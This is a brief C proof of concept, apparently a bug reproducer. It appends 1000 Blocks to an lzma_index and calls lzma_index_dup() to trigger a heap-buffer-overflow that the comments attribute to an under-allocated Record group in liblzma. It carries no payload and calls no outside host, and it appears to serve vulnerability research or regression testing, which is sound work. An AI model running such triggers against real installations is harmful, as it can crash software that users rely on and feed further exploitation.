// Residual heap-buffer-overflow PoC for lzma_index_dup().
//
// Builds an in-memory lzma_index with one Stream containing more Blocks
// than fit into a single internal Record group (> 512), then duplicates
// it with the public lzma_index_dup() API. On the shipped tree this
// under-allocates the merged Record group used by the duplicate and
// overflows it while copying Records from the source Stream's first
// (full) group.
#include <lzma.h>
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    lzma_index *idx = lzma_index_init(NULL);
    if (idx == NULL) {
        fprintf(stderr, "lzma_index_init failed\n");
        return 1;
    }

    // Append enough Blocks to force the Stream's Records to span more
    // than one internal group (default group size is 512 Records).
    const size_t num_blocks = 1000;
    for (size_t i = 0; i < num_blocks; ++i) {
        lzma_ret ret = lzma_index_append(idx, NULL, 32, 16);
        if (ret != LZMA_OK) {
            fprintf(stderr, "lzma_index_append failed: %d\n", ret);
            return 1;
        }
    }

    lzma_index *copy = lzma_index_dup(idx, NULL);
    if (copy == NULL) {
        fprintf(stderr, "lzma_index_dup failed\n");
        return 1;
    }

    printf("duplicated index ok\n");

    lzma_index_end(copy, NULL);
    lzma_index_end(idx, NULL);
    return 0;
}
